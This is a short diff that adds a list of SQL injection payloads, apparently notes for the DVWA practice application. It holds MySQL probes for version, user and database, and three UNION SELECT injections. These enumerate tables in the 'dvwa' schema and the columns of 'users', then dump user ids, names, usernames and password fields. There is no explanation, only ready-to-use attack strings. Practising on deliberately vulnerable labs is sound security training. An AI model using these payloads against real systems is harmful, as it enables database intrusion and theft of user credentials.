@@ -1,0 +1,6 @@
+version()
+user()
+database()
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = 'dvwa' #
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'users' #
+' UNION SELECT 1, concat(user_id,':',first_name,':',last_name,':',user,':',password) from users#
